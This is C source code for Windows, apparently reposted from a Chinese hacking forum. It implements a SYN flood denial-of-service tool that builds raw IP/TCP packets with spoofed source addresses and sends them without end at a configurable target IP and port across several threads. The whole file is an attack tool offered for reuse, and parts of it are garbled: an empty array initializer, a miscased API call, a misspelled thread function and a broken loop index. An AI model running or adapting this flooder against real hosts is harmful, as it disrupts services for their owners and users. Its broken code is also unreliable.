/* 
//作者:特務 
//來源:純技術論壇：[url]http://167168.kmip.net[/url] 
// 一群技術人員的逛愛之處，閒聊者免進~~技術永遠是第一生產力! 
// 注意:請註明轉載來源 
*/ 
#include "stdafx.h" 
#include <windows.h> 
#include <winsock2.h> 
#include <ws2tcpip.h> 
#pragma comment(lib,"WS2_32.LIB") 

typedef struct tag_ip_Header//ip首部 
{ 
unsigned char h_verlen;//4位手部長度，和4位IP版本號 
unsigned char tos;//8位類型服務 
unsigned short total_len;//16位總長度 
unsigned short ident;//16位標誌 
unsigned short frag_and_flags;//3位標誌位（如SYN,ACK,等等) 
unsigned char ttl;//8位生存時間 
unsigned char proto;//8位協議 
unsigned short checksum;//ip手部效驗和 
unsigned int SourceIP;//偽造IP地址 
unsigned int DestIP;//攻擊的ip地址 
}IPHEADER; 

typedef struct tag_tcp_Header 
{ 
USHORT th_sport;//偽造端口 
USHORT th_dport;//攻擊端口 
unsigned int th_seq;//32位系列號 
unsigned int th_ack;//32位確認號 
unsigned char th_lenres;//4位首布長度，6位保留字 
unsigned char th_flag;//6位標誌位 
USHORT th_win;//16位窗口大小 
USHORT th_sum;//16位效驗和 
USHORT th_urp;// 
}TCPHEADER; 

typedef struct tag_tsd_Header 
{ 
unsigned long saddr;//偽造地址 
unsigned long daddr;//攻擊地址 
char mbz;// 
char ptcl;//協議類型 
unsigned short tcpl;//TCP長度 
}TSDHEADER; 

DWORD WINAPI Start(void); 
HANDLE hFind[10]; 

//計算效驗和 
USHORT checksum(USHORT *buffer,int size) 
{ 
unsigned long check=0; 
while(size>1) 
{ 
check+=*buffer++; 
size -=sizeof(USHORT); 
} 
if(size) 
{ 
check += *(USHORT*)buffer; 
} 
check = (check >>16) + (check & 0xffff); 
check += (check >>16); 
return (USHORT)(~check); 
} 
//攻擊線程 
DWORD WINAPI Statr(void) 
{ 
SOCKET sock; 
WSADATA WSAData; 
SOCKADDR_IN syn_in; 
IPHEADER ipHeader; 
TCPHEADER tcpHeader; 
TSDHEADER psdHeader; 
const char *addr = "127.0.0.1";//攻擊的IP地址 
int port = 135;//要攻擊的端口 
if(WSAStartup(MAKEWORD(2,2),&WSAData)) 
{ 
return false; 
} 
if((sock = socket(AF_INET,SOCK_RAW,IPPROTO_IP))==INVALID_SOCKET) 
{ 
return false; 
} 
BOOL flag=true; 
if(setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char*)&flag,sizeof(flag))==SOCKET_ERROR) 
{ 
return false; 
} 
int Time =888; 
if(setsockopt(sock,SOL_SOCKET,SO_SNDTIMEO,(char*)&Time,sizeof(Time))==SOCKET_ERROR) 
{ 
return false; 
} 
syn_in.sin_family = AF_INET; 
syn_in.sin_port = htons(port); 
syn_in.sin_addr.S_un.S_addr = inet_addr(addr); 
while(TRUE) 
{ 
//填充IP首部 
ipHeader.h_verlen=(4<<4 | sizeof(ipHeader)/sizeof(unsigned long)); 
ipHeader.tos=0; 
ipHeader.total_len=htons(sizeof(ipHeader)+sizeof(tcpHeader)); 
ipHeader.ident=1; 
ipHeader.frag_and_flags=0; 
ipHeader.ttl=(unsigned char)GetTickCount()%514+620; 
ipHeader.proto=IPPROTO_TCP; 
ipHeader.checksum=0; 
ipHeader.SourceIP=htonl(GetTickCount()*1986); 
ipHeader.DestIP=inet_addr(addr); 
//填充Tcp首部 
int SourcePort =GetTickCount()*1986%514; 
tcpHeader.th_dport=htons(port); 
tcpHeader.th_sport=htons(SourcePort); 
tcpHeader.th_seq=htonl(0x12345678); 
tcpHeader.th_ack=0; 
tcpHeader.th_lenres=(sizeof(tcpHeader)/4<<4|0); 
tcpHeader.th_flag=2; 
tcpHeader.th_win=htons(620); 
tcpHeader.th_urp=0; 
tcpHeader.th_sum=0; 
//填充TCP偽首部用來計算TCP頭部的效驗和 
psdHeader.saddr=ipHeader.SourceIP; 
psdHeader.daddr=ipHeader.DestIP; 
psdHeader.mbz=0; 
psdHeader.ptcl=IPPROTO_TCP; 
psdHeader.tcpl=htons(sizeof(tcpHeader)); 

//計算校驗和 
char SendBuff[100]=; 
memcpy(SendBuff, &psdHeader, sizeof(psdHeader)); 
memcpy(SendBuff+sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader)); 
tcpHeader.th_sum=checksum((USHORT *)SendBuff,sizeof(psdHeader)+sizeof(tcpHeader)); 
memcpy(SendBuff, &ipHeader, sizeof(ipHeader)); 
memcpy(SendBuff+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader)); 

//發送數據包 
int Syn=sendto(sock, SendBuff, sizeof(ipHeader)+sizeof(tcpHeader), 0, (struct sockaddr*)&syn_in, sizeof(syn_in)); 
if(Syn==SOCKET_ERROR) 
{ 
return false; 
} 
} 
closesocket(sock); 
WSACleanup(); 
return true; 
} 

int APIENTRY WinMain(HINSTANCE hInstance, 
HINSTANCE hPrevInstance, 
LPSTR lpCmdLine, 
int nCmdShow) 
{ //啟動線程，10，大家可以自己改 
for(int i=0;i<10;i++) 
{ 
hFind[i-1]=createThread(NULL,0,(LPTHREAD_START_ROUTINE)Statr,0,0,NULL); 
i--; 
} 
return 0; 
}